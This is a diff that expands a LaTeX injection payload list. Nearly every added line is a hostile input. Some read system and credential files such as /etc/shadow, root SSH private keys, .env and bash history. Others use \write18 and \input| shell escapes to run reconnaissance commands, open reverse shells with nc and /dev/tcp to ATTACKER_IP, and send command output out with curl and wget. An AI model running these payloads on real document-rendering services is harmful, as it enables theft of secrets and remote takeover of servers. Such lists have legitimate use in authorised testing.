@@ -1,31 +1,68 @@
-\textbf{test}
-\textit{test}
-$1+1=2$
-\LaTeX
-{hello}
-
 \input{/etc/passwd}
 \include{/etc/passwd}
-\verbatiminput{/etc/passwd}
 \input{/etc/shadow}
-\input{/proc/self/environ}
-\input{/root/.ssh/id_rsa}
-\input{/var/www/html/.env}
+\input{/etc/hostname}
+\input{/etc/hosts}
+\input{/proc/version}
+\input{/proc/self/cmdline}
 \input{/var/www/html/config.php}
+\input{/var/www/html/.env}
+\input{/root/.bash_history}
+\input{/root/.ssh/id_rsa}
+\input{/home/user/.ssh/id_rsa}
+\input{/etc/mysql/my.cnf}
+\input{/etc/apache2/sites-enabled/000-default.conf}
+\input{/etc/nginx/nginx.conf}
+\include{/etc/shadow}
+\include{/etc/hostname}
+\include{/proc/version}
+\include{/root/.ssh/id_rsa}
+\verbatiminput{/etc/passwd}
+\verbatiminput{/etc/shadow}
+\verbatiminput{/etc/hosts}
+\verbatiminput{/proc/version}
+\verbatiminput{/root/.ssh/id_rsa}
 \lstinputlisting{/etc/passwd}
-\lstinputlisting{/etc/hostname}
-
-\input{C:/Windows/win.ini}
-\input{C:/Windows/System32/drivers/etc/hosts}
-\verbatiminput{C:/inetpub/wwwroot/web.config}
-
-\input{http://169.254.169.254/latest/meta-data/}
-\input{http://127.0.0.1:8080/admin}
-
-\newcommand{\test}{pwned}
-\test
-$\frac{1}{0}$
-\expandafter\show\csname @firstoftwo\endcsname
-
-\url{https://evil.com}
-\href{https://evil.com}{click}
+\lstinputlisting{/etc/shadow}
+\lstinputlisting{/etc/hosts}
+\lstinputlisting{/proc/version}
+\lstinputlisting{/root/.ssh/id_rsa}
+\usepackage[pdftex]{graphicx}\includegraphics{/etc/passwd}
+\graphicspath{{/etc/}}\includegraphics{passwd}
+\input|cat /etc/passwd
+\include|cat /etc/passwd
+\input|ls /
+\input|id
+\input|whoami
+\input|uname -a
+\input|cat /etc/shadow
+\input|env
+\write18{id}
+\write18{whoami}
+\write18{cat /etc/passwd}
+\write18{cat /etc/shadow}
+\write18{ls -la /}
+\write18{ls -la /var/www/html}
+\write18{env}
+\write18{uname -a}
+\write18{hostname}
+\write18{cat /proc/version}
+\write18{find / -name "*.conf" 2>/dev/null}
+\write18{find / -perm -u=s 2>/dev/null}
+\write18{ps aux}
+\write18{netstat -an}
+\write18{cat /root/.ssh/id_rsa}
+\write18{cat ~/.bash_history}
+\write18{nc -e /bin/bash ATTACKER_IP 4444}
+\write18{bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1}
+\write18{curl http://ATTACKER_IP/$(id|base64)}
+\write18{wget http://ATTACKER_IP/$(whoami)}
+\immediate\write18{id}
+\immediate\write18{whoami}
+\immediate\write18{cat /etc/passwd}
+\immediate\write18{cat /etc/shadow}
+\immediate\write18{ls /}
+\immediate\write18{uname -a}
+\immediate\write18{env}
+\immediate\write18{curl http://ATTACKER_IP/$(id|base64)}
+\immediate\write18{nc -e /bin/bash ATTACKER_IP 4444}
